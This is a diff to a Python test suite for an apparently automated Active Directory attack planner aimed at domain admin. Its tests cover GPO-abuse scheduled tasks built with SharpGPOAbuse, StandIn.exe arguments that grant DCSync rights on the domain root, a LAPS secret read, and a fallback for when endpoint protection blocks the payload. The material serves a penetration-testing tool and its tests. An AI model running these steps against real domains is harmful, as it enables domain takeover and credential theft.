@@ -69,6 +69,7 @@ def test_gpo_controlled_system_exec_candidate_is_generic():
             _fact("generic-write:gpo:workstation-policy"),
             _fact("gpo-domain:workstation-policy:lab.local"),
             _fact("gpo-guid:workstation-policy:0a93e998-2599-4da8-9717-6744993ded3a"),
+            _fact("gpo-affects-computer:workstation-policy:dc01:lab.local"),
             _fact("gpo-affects-dc:workstation-policy:dc01:lab.local"),
         ],
     )
@@ -86,10 +87,31 @@ def test_gpo_controlled_system_exec_candidate_is_generic():
     assert action.intent["gpo"] == "workstation-policy"
     assert action.intent["domain"] == "lab.local"
     assert action.intent["gpo_guid"] == "0a93e998-2599-4da8-9717-6744993ded3a"
+    assert action.intent["affected_hosts"] == ["dc01"]
     assert action.intent["affected_dc_hosts"] == ["dc01"]
     assert action.intent["preferred_effect"] == "domain-admin-membership"
+    assert "gpo-affects-computer:workstation-policy:dc01:lab.local" in action.source_facts
     assert "gpo-affects-dc:workstation-policy:dc01:lab.local" in action.source_facts
     assert "BloodHound scope includes DC host(s): dc01" in action.reason
+
+
+def test_gpo_non_dc_candidate_preserves_affected_host_without_da_effect():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("range.local", identity=r"RANGE\user1")],
+        graph_facts=[
+            _fact("generic-write:gpo:srv02-policy"),
+            _fact("gpo-domain:srv02-policy:range.local"),
+            _fact("gpo-affects-computer:srv02-policy:srv02:range.local"),
+        ],
+    )
+
+    action = capabilities.actions_from_state(state)[0]
+
+    assert action.effects == ["system-exec:gpo:srv02-policy@range.local"]
+    assert action.intent["affected_hosts"] == ["srv02"]
+    assert action.intent["affected_dc_hosts"] == []
+    assert action.intent["preferred_effect"] == "system-exec-proof"
 
 
 def test_gpo_candidate_accepts_equivalent_netbios_foothold_domain():
@@ -142,6 +164,43 @@ def test_gpo_capability_does_not_assume_legacy_gpo_abuse_is_system_exec():
 
     assert len(actions) == 1
     assert "SYSTEM execution still needs proof" in actions[0].reason
+
+
+def test_terminal_gpo_failure_suppresses_same_lane_but_preserves_laps_alternative():
+    blocked_gpo = es.Hop(
+        id="blocked-gpo",
+        technique="capability:gpo-controlled-system-exec",
+        target="gpo=srv02-policy;domain=range.local",
+        effect="system-exec:gpo:srv02-policy@range.local",
+        status="blocked",
+        evidence={
+            "terminal_failure": True,
+            "defender_blocked": True,
+            "verify_reason": "endpoint protection blocked the staged GPO payload on srv02",
+        },
+        preconditions=[],
+        satisfied_effects=["system-exec:gpo:srv02-policy@range.local"],
+        source="test",
+        timestamp=NOW,
+    )
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("range.local", identity=r"RANGE\user1")],
+        hops=[blocked_gpo],
+        graph_facts=[
+            _fact("generic-write:gpo:srv02-policy"),
+            _fact("gpo-domain:srv02-policy:range.local"),
+            _fact(
+                "can-read-managed-local-admin-secret:"
+                "account=user1;account_domain=range.local;target=ca01;target_domain=range.local"
+            ),
+        ],
+    )
+
+    names = [action.name for action in capabilities.actions_from_state(state)]
+
+    assert "gpo-controlled-system-exec" not in names
+    assert "read-managed-local-admin-secret" in names
 
 
 def test_legacy_gpo_capability_suppressed_after_downstream_domain_proof():
@@ -1457,6 +1516,36 @@ def test_build_gpo_system_exec_direct_plan_reads_back_structured_artifact_when_g
     _assert_payload_agnostic_plan(plan)
 
 
+def test_build_gpo_system_exec_reads_distinct_unc_proof_path():
+    action = capabilities.CapabilityAction(
+        name="gpo-controlled-system-exec",
+        target="gpo=srv02-policy;domain=range.local",
+        preconditions=["generic-write:gpo:srv02-policy"],
+        effects=["system-exec:gpo:srv02-policy@range.local"],
+        intent={
+            "capability": "gpo-controlled-system-exec",
+            "domain": "range.local",
+            "gpo": "srv02-policy",
+            "affected_hosts": ["srv02"],
+        },
+    )
+
+    plan = capabilities.build_capability_execution_plan(action, {
+        "allow_proof_only": True,
+        "proof_path": r"C:\SageProof\sage_gpo_srv02_policy_whoami.txt",
+        "proof_unc": r"\\srv02.range.local\SageProof\sage_gpo_srv02_policy_whoami.txt",
+    })
+
+    assert plan.ok is True
+    assert plan.steps[0].parameters["arguments"] == (
+        r"/c whoami > C:\SageProof\sage_gpo_srv02_policy_whoami.txt"
+    )
+    assert plan.steps[-1].operation == "gpo-proof-read"
+    assert plan.steps[-1].parameters["proof_path"] == (
+        r"\\srv02.range.local\SageProof\sage_gpo_srv02_policy_whoami.txt"
+    )
+
+
 def test_structured_artifact_validator_rejects_malformed_xml():
     output = (
         r"\\lab.local\SYSVOL\lab.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
@@ -1676,6 +1765,35 @@ def test_build_gpo_system_exec_fallback_allows_local_refresh_when_callback_host_
         "method": "gpp-immediate-task-fallback",
         "allow_proof_only": True,
         "current_host": "DC01.lab.local",
+        "wait_seconds": 11,
+    })
+
+    assert plan.ok is True
+    assert [step.operation for step in plan.steps][:3] == [
+        "gpo-immediate-task-fallback",
+        "gpo-refresh-local",
+        "gpo-wait",
+    ]
+
+
+def test_build_gpo_system_exec_fallback_allows_local_refresh_for_non_dc_affected_host():
+    action = capabilities.CapabilityAction(
+        name="gpo-controlled-system-exec",
+        target="gpo=srv02-policy;domain=range.local",
+        preconditions=["generic-write:gpo:srv02-policy"],
+        effects=["system-exec:gpo:srv02-policy@range.local"],
+        intent={
+            "capability": "gpo-controlled-system-exec",
+            "domain": "range.local",
+            "gpo": "srv02-policy",
+            "affected_hosts": ["srv02"],
+        },
+    )
+
+    plan = capabilities.build_capability_execution_plan(action, {
+        "method": "gpp-immediate-task-fallback",
+        "allow_proof_only": True,
+        "current_host": "SRV02.range.local",
         "wait_seconds": 11,
     })
 
@@ -1938,7 +2056,7 @@ def test_build_grant_directory_rights_requires_principal():
     assert plan.steps == []
 
 
-def test_build_grant_directory_rights_gpo_task_plan_uses_standin_guids():
+def test_build_grant_directory_rights_gpo_task_plan_uses_single_standin_dcsync_task():
     state = es.EngagementState(
         objective="domain admin",
         footholds=[_foothold("lab.local")],
@@ -1949,24 +2067,42 @@ def test_build_grant_directory_rights_gpo_task_plan_uses_standin_guids():
     plan = capabilities.build_capability_execution_plan(action, {"principal": "LAB\\operator"})
 
     assert plan.ok is True
-    assert len(plan.steps) == 4
-    grant_steps = plan.steps[:3]
-    verify_step = plan.steps[3]
-    assert {step.operation for step in grant_steps} == {"gpo-computer-task"}
-    assert all(step.parameters["tool"] == "SharpGPOAbuse.exe" for step in grant_steps)
-    assert all(step.parameters["command"] == r"C:\Windows\Temp\StandIn.exe" for step in grant_steps)
-    joined = "\n".join(step.parameters["arguments"] for step in grant_steps)
-    assert "--object DC=lab,DC=local --grant LAB\\operator --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" in joined
-    assert "--object DC=lab,DC=local --grant LAB\\operator --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" in joined
-    assert "--object DC=lab,DC=local --grant LAB\\operator --guid 89e95b76-444d-4c62-991a-0facbeda640c" in joined
-    assert all(step.prerequisites for step in grant_steps)
+    assert len(plan.steps) == 3
+    grant_step, wait_step, verify_step = plan.steps
+    assert grant_step.operation == "gpo-computer-task"
+    assert grant_step.parameters["tool"] == "SharpGPOAbuse.exe"
+    assert grant_step.parameters["command"] == r"C:\Windows\Temp\StandIn.exe"
+    assert grant_step.parameters["arguments"] == (
+        "--object distinguishedname=DC=lab,DC=local --grant LAB\\operator --type DCSync"
+    )
+    assert grant_step.prerequisites
+    assert wait_step.operation == "gpo-wait"
+    assert wait_step.parameters["seconds"] == 300
     assert verify_step.operation == "ldap-acl-read"
     assert verify_step.parameters == {
         "tool": "StandIn.exe",
         "target_dn": "DC=lab,DC=local",
+        "principal": "LAB\\operator",
         "ntacl": True,
     }
     _assert_payload_agnostic_plan(plan)
+
+
+def test_build_grant_directory_rights_qualifies_bare_principal_for_standin():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("lab.local")],
+        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
+    )
+    action = next(item for item in capabilities.actions_from_state(state) if item.name == "grant-directory-rights")
+
+    plan = capabilities.build_capability_execution_plan(action, {"principal": "operator"})
+
+    assert plan.ok is True
+    assert plan.steps[0].parameters["arguments"] == (
+        "--object distinguishedname=DC=lab,DC=local --grant LAB\\operator --type DCSync"
+    )
+    assert plan.steps[-1].parameters["principal"] == "LAB\\operator"
 
 
 def test_build_grant_directory_rights_direct_plan_is_ldap_primitives():
